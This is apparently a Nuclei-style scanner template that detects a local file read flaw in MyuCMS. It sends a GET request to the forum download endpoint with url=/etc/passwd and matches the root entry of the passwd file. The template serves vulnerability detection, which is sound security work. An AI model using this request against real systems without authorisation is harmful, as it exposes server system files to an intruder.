id: myucms-lfr
info:
  author: princechaddha
  name: MyuCMS Local File Read
  reference: https://blog.csdn.net/yalecaltech/article/details/104908257
  severity: high
  tags: myucms,lfi
requests:
- matchers:
  - regex:
    - 'root:[x*]:0:0:'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
